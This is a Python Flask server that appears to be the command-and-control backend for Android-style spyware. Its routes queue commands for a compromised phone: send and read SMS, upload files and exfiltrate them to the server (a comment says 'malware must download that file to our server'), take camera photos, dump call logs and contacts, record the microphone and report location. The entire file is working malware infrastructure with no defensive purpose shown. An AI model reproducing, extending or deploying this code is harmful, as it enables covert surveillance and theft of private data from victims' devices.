from flask import Flask
from flask import request
from functools import wraps

import psycopg2
import uuid
import json

app = Flask(__name__)
conn = psycopg2.connect("host=127.0.0.1 port=5432 dbname=db user=user password=pwd")

sfalse = json.dumps({"success": False})

@app.errorhandler(404)
def handle404(error):
    html = "<center>"
    html += "<br><br><br>"
    html += '<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ?controls=0&autoplay=1" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>'
    html += "<br>"
    html += "nothing to do here :p"
    html += "</center>"
    return html

def general_validation(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if request.method == "POST":
            if "deploy_id" not in request.form:
                return sfalse
        if request.method == "GET":
            if "deploy_id" not in request.args:
                return sfalse
        return f(*args, **kwargs)
    return wrapped

@app.route('/sms/send', methods=['POST'])
@general_validation
def sms_send():
    form = request.form
    if "target" in form and "payload" in form and "deploy_id" in form:
        deploy_at = form["deploy_id"]
        target = form["target"]
        payload = form["payload"]

        cur = conn.cursor()
        # generate command_id
        command_id = str(uuid.uuid4())
        # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
        cur.execute("insert into command_center values (%s, %s, %s, 0, 0, %s, %s, '{}', '')", 
                    (command_id, deploy_at, 'send-sms', target, payload))
        # commit - save persistent
        conn.commit()
        # close cursor
        cur.close()
        return json.dumps({"command_id": command_id, "success": True})
    return sfalse

@app.route('/sms/get')
def sms_get():
    query = request.args
    if "deploy_id" in query:
        deploy_at = query["deploy_id"]

        cur = conn.cursor()
        # generate command_id
        command_id = str(uuid.uuid4())
        # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
        cur.execute("insert into command_center values (%s, %s, %s, 0, 0, '', '', '{}', '')", 
                    (command_id, deploy_at, 'get-sms'))
        # commit - save persistent
        conn.commit()
        # close cursor
        cur.close()
        return json.dumps({"command_id": command_id, "success": True})
    return sfalse

@app.route('/file/upload', methods=['POST'])
@general_validation
def file_upload():
    if 'file' not in request.files:
        return sfalse
    form = request.form

    file = request.files['file']
    if file.filename == '':
        return sfalse

    if "path" in form:
        deploy_at = form["deploy_id"]
        save_at = form["path"]

        # generate command_id
        command_id = str(uuid.uuid4())

        ext = file.filename.split(".")[-1]
        file.save("./" + command_id + "." + ext)

        # open cursor
        cur = conn.cursor()
        # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
        cur.execute("insert into command_center values (%s, %s, %s, 0, 0, %s, %s, '{}', '')", 
                    (command_id, deploy_at, 'upload-file', save_at))
        # commit - save persistent
        conn.commit()
        # close cursor
        cur.close()
        return json.dumps({"command_id": command_id, "success": True})
    return sfalse

@app.route('/file/download', methods=['POST'])
@general_validation
def file_download():
    form = request.form
    # path, recursive, description :
    # if path is a single file, then malware must download that file
    # to our server
    # if path is a folder, download all files in the folder
    # if path is a folder, and recursive option are enabled, that follow child path
    # and download all the file
    if "path" in form and "recursive" in form:
        deploy_at = form["deploy_id"]
        path = form["path"]
        recursive = True if form["path"] == "true" else False
        recursive_jsonb = json.dumps({"recursive": recursive})
        # generate command_id
        command_id = str(uuid.uuid4())
        # open cursor
        cur = conn.cursor()
        # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
        cur.execute("insert into command_center values (%s, %s, %s, 0, 0, %s, '', %s, '')", 
                    (command_id, deploy_at, 'download-file', path, recursive_jsonb))
        # commit - save persistent
        conn.commit()
        # close cursor
        cur.close()
        return json.dumps({"command_id": command_id, "success": True})
    return sfalse

@app.route('/camera/take')
@general_validation
def camera_take():
    query = request.args
    if "index" in query and "deploy_id" in query:
        deploy_at = query["deploy_id"]
        camera = query["index"]

        # generate command_id 
        command_id = str(uuid.uuid4())
        # open cursor
        cur = conn.cursor()
        # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
        cur.execute("insert into command_center values (%s, %s, %s, 0, 0, %s, '', '{}', '')", 
                    (command_id, deploy_at, 'camera-take', camera))
        # commit - save persistent
        conn.commit()
        # close cursor
        cur.close()
        return json.dumps({"command_id": command_id, "success": True})
    return sfalse

@app.route("/call/log")
@general_validation
def call_log():
    query = request.args
    if "deploy_id" in query:
        deploy_at = query["deploy_id"]
        # generate command_id 
        command_id = str(uuid.uuid4())
        # open cursor
        cur = conn.cursor()
        # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
        cur.execute("insert into command_center values (%s, %s, %s, 0, 0, '', '', '{}', '')", 
                    (command_id, deploy_at, 'call-log'))
        # commit - save persistent
        conn.commit()
        # close cursor
        cur.close()
        return json.dumps({"command_id": command_id, "success": True})
    return sfalse

@app.route("/contact/save")
@general_validation
def contact_save():
    form = request.form
    if "name" in form and "phone" in form:
        deploy_at = form["deploy_id"]
        name = form["name"]
        phone = form["phone"]
        contact_jsonb = json.dumps({"name": name, "phone": phone})
        # generate command_id 
        command_id = str(uuid.uuid4())
        # open cursor
        cur = conn.cursor()
        # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
        cur.execute("insert into command_center values (%s, %s, %s, 0, 0, '', '', %s, '')", 
                    (command_id, deploy_at, 'contact-save', contact_jsonb))
        # commit - save persistent
        conn.commit()
        # close cursor
        cur.close()
        return json.dumps({"command_id": command_id, "success": True})
    return sfalse

@app.route("/contact/get")
def contact_get():
    deploy_at = request.args["deploy_id"]
    # generate command_id 
    command_id = str(uuid.uuid4())
    # open cursor
    cur = conn.cursor()
    # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
    cur.execute("insert into command_center values (%s, %s, %s, 0, 0, '', '', '{}', '')", 
                (command_id, deploy_at, 'contact-get'))
    # commit - save persistent
    conn.commit()
    # close cursor
    cur.close()
    return json.dumps({"command_id": command_id, "success": True})

@app.route("/mic/record")
def mic_record():
    deploy_at = request.args["deploy_id"]
    record_time = 5
    if "record_time" in request.args and request.args["record_time"].isdigit():
        record_time = int(request.args["record_time"])
    record_jsonb = json.dumps({"record_time": record_time})
    # generate command_id 
    command_id = str(uuid.uuid4())
    # open cursor
    cur = conn.cursor()
    # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
    cur.execute("insert into command_center values (%s, %s, %s, 0, 0, '', '', %s, '')", 
                (command_id, deploy_at, 'mic-record', record_jsonb))
    # commit - save persistent
    conn.commit()
    # close cursor
    cur.close()
    return json.dumps({"command_id": command_id, "success": True})

@app.route("/location/get")
def location_get():
    deploy_at = request.args["deploy_id"]
    # generate command_id 
    command_id = str(uuid.uuid4())
    # open cursor
    cur = conn.cursor()
    # command_id,deploy_id,command_type,start_at,finish_at,target,payload,args,command_raw
    cur.execute("insert into command_center values (%s, %s, %s, 0, 0, '', '', '{}', '')", 
                (command_id, deploy_at, 'location-get'))
    # commit - save persistent
    conn.commit()
    # close cursor
    cur.close()
    return json.dumps({"command_id": command_id, "success": True})

app.run(host="127.0.0.1", port=3000)
